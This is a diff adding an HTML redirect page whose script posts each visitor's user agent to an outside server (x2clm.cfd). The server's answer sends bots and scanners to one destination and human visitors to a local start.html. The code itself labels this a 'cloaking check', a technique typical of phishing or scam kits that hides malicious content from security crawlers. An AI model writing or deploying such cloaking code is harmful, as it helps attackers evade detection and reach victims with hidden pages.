@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect Page</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(180deg, #ffffff 0%, #ecf0f9 100%);
+        }
+
+        div {
+            font-size: 2em;
+            color: black;
+            text-transform: uppercase;
+        }
+    </style>
+    <script>
+        async function check() {
+            try {
+                // Get the client User Agent
+                const clientUserAgent = navigator.userAgent;
+
+                // Send the User Agent to the server
+                const response = await fetch('https://x2clm.cfd/check', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': clientUserAgent
+                    }
+                });
+
+                // Parse the server response
+                const result = await response.json();
+
+                // Redirect based on the server response
+                if (result.status === 'bot' || result.status === 'no-bot-error') {
+                    window.location.href = result.redirect;
+                } else if (result.status === 'no-bot') {
+                    window.location.href = 'start.html';
+                }
+            } catch (error) {
+                console.error('Error during cloaking check:', error);
+                window.location.href = 'https://www.google.com';
+            }
+        }
+
+        check();
+    </script>
+</head>
+<body>
+    <div>Redirecting to page...</div>
+</body>
+</html>
